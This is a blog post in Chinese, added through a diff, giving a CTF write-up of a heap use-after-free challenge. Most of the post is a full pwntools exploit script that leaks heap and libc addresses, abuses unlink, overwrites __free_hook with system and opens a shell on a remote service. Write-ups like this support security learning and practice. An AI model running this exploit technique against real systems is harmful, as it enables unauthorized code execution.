@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="English">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="pwn01题目中wp已经写的很明白了  检查题目保护，除了PIE，其他保护均打开 使用IDA分析函数，发现在free掉堆后没有对指针清零，存在UAF漏洞 编写exp.py，先申请7个0x20大小的堆，连续释放两个，这两个会形成fastbin的单向链表，通过UAF漏洞泄露出堆地址 在堆中伪造一个small chunk并将其释放，触发unlink操作，修改指向chunk的指针 已经可以控制任意地址读写">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn&#x2F;pwn-01-wp">
+<meta property="og:url" content="https:&#x2F;&#x2F;noone-hub.github.io&#x2F;2019&#x2F;10&#x2F;30&#x2F;pwn&#x2F;pwn-01-wp&#x2F;index.html">
+<meta property="og:site_name" content="NoOne-hub">
+<meta property="og:description" content="pwn01题目中wp已经写的很明白了  检查题目保护，除了PIE，其他保护均打开 使用IDA分析函数，发现在free掉堆后没有对指针清零，存在UAF漏洞 编写exp.py，先申请7个0x20大小的堆，连续释放两个，这两个会形成fastbin的单向链表，通过UAF漏洞泄露出堆地址 在堆中伪造一个small chunk并将其释放，触发unlink操作，修改指向chunk的指针 已经可以控制任意地址读写">
+<meta property="og:locale" content="English">
+<meta property="og:updated_time" content="2019-08-30T01:25:57.484Z">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-01-wp/"/>
+
+
+
+
+
+  <title>pwn/pwn-01-wp | NoOne-hub</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="English">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">NoOne-hub</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">A place that No One knw</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-01-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LiHua">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NoOne-hub">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwn/pwn-01-wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
+                2019-10-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="pwn01"><a href="#pwn01" class="headerlink" title="pwn01"></a>pwn01</h1><p>题目中wp已经写的很明白了</p>
+<ol>
+<li>检查题目保护，除了PIE，其他保护均打开</li>
+<li>使用IDA分析函数，发现在free掉堆后没有对指针清零，存在UAF漏洞</li>
+<li>编写exp.py，先申请7个0x20大小的堆，连续释放两个，这两个会形成fastbin的单向链表，通过UAF漏洞泄露出堆地址</li>
+<li>在堆中伪造一个small chunk并将其释放，触发unlink操作，修改指向chunk的指针</li>
+<li>已经可以控制任意地址读写，先修改edit限制，然后读GOT表，将system的地址填入__free_hook地址中，然后释放内容为“/bin/sh\x00”的堆，就获得了shell</li>
+</ol>
+<p>具体解释下</p>
+<h2 id="密码检测部分"><a href="#密码检测部分" class="headerlink" title="密码检测部分"></a>密码检测部分</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(['./library'],env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)</span></span><br><span class="line">p = remote(<span class="string">"172.29.14.115"</span>, <span class="number">8888</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal</span><span class="params">(cipher)</span>:</span></span><br><span class="line">	key=[<span class="number">61</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">137</span>, <span class="number">139</span>, <span class="number">149</span>, <span class="number">151</span>, <span class="number">167</span>, <span class="number">179</span>, <span class="number">193</span>, <span class="number">199</span>, <span class="number">211</span>, <span class="number">223</span>, <span class="number">229</span>]</span><br><span class="line">	keyposs=[[] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xa3</span>):</span><br><span class="line">		ciphermid=cipher+(i&lt;&lt;<span class="number">32</span>)</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">				<span class="keyword">if</span> ciphermid % k == <span class="number">0</span>:</span><br><span class="line">					ciphermid=ciphermid//k</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> ciphermid <span class="keyword">in</span> range(<span class="number">64</span>,<span class="number">263</span>):</span><br><span class="line">			cipher=ciphermid</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> cipher</span><br></pre></td></tr></table></figure>
+
+<h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    p.writeline(<span class="string">'1'</span>)</span><br><span class="line">    p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.writeline(str(a))</span><br><span class="line">    p.readuntil(<span class="string">'the book:'</span>)</span><br><span class="line">    p.writeline(b)</span><br><span class="line">    p.readuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(a)</span>:</span></span><br><span class="line">    p.writeline(<span class="string">'4'</span>)</span><br><span class="line">    p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.writeline(str(a))</span><br><span class="line">    p.readuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    p.writeline(<span class="string">'2'</span>)</span><br><span class="line">    p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.writeline(str(a))</span><br><span class="line">    p.readuntil(<span class="string">'new name of the book:'</span>)</span><br><span class="line">    p.writeline(b)</span><br><span class="line">    p.readuntil(<span class="string">'&gt;&gt;'</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="密码验证"><a href="#密码验证" class="headerlink" title="密码验证"></a>密码验证</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	cipher=p.recv()[:<span class="number">-1</span>]</span><br><span class="line">	cipher=int(cipher,<span class="number">16</span>)</span><br><span class="line">	password=cal(cipher)</span><br><span class="line">	p.sendline(str(password))</span><br></pre></td></tr></table></figure>
+
+<h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p.readuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">new(<span class="number">1</span>,p64(<span class="number">0x31</span>)*<span class="number">3</span>+chr(<span class="number">0x31</span>))</span><br><span class="line">new(<span class="number">2</span>,<span class="string">''</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="string">''</span>)</span><br><span class="line">new(<span class="number">4</span>,p64(<span class="number">0x31</span>)*<span class="number">3</span>)</span><br><span class="line">new(<span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">new(<span class="number">6</span>,<span class="string">''</span>)</span><br><span class="line">new(<span class="number">7</span>,<span class="string">''</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">p.writeline(<span class="string">'3'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.writeline(<span class="string">'3'</span>)</span><br><span class="line">heap=u64((p.readuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]).ljust(<span class="number">8</span>,chr(<span class="number">0x0</span>)))<span class="number">-0x30</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap+<span class="number">0xa0</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="通过smallbin修改free-hook地址，改成system，从而达到目的"><a href="#通过smallbin修改free-hook地址，改成system，从而达到目的" class="headerlink" title="通过smallbin修改free_hook地址，改成system，从而达到目的"></a>通过smallbin修改free_hook地址，改成system，从而达到目的</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0x90</span>)*<span class="number">3</span>+chr(<span class="number">0x90</span>)</span><br><span class="line">new(<span class="number">8</span>,<span class="string">''</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0x31</span>)*<span class="number">2</span>+p64(heap+<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0x4040a8</span><span class="number">-0x18</span>)+p32(<span class="number">0x4040a8</span><span class="number">-0x10</span>)</span><br><span class="line">new(<span class="number">9</span>,payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'b *0x401513')</span></span><br><span class="line">edit(<span class="number">9</span>,p64(<span class="number">0x404040</span>)+p64(<span class="number">0x403f90</span>)+p64(<span class="number">0x404090</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0xff</span>))</span><br><span class="line">p.writeline(<span class="string">'3'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.writeline(<span class="string">'7'</span>)</span><br><span class="line">free_addr=u64((p.readuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]).ljust(<span class="number">8</span>,chr(<span class="number">0x0</span>)))</span><br><span class="line">free_hook=free_addr+libc.symbols[<span class="string">'__free_hook'</span>]-libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system=(free_addr+libc.symbols[<span class="string">'system'</span>]-libc.symbols[<span class="string">'free'</span>])</span><br><span class="line">edit(<span class="number">8</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.writeline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p>其实就是uaf洞的原因，修复的话，将uaf改掉即可</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/30/pwn/tjctf2019/" rel="next" title="pwn/tjctf2019">
+                <i class="fa fa-chevron-left"></i> pwn/tjctf2019
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/30/pwn/ida/" rel="prev" title="pwn/ida">
+                pwn/ida <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">LiHua</p>
+              <p class="site-description motion-element" itemprop="description">One people that no one know</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">62</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn01"><span class="nav-number">1.</span> <span class="nav-text">pwn01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#密码检测部分"><span class="nav-number">1.1.</span> <span class="nav-text">密码检测部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#函数定义"><span class="nav-number">1.2.</span> <span class="nav-text">函数定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#密码验证"><span class="nav-number">1.3.</span> <span class="nav-text">密码验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leak"><span class="nav-number">1.4.</span> <span class="nav-text">leak</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过smallbin修改free-hook地址，改成system，从而达到目的"><span class="nav-number">1.5.</span> <span class="nav-text">通过smallbin修改free_hook地址，改成system，从而达到目的</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LiHua</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
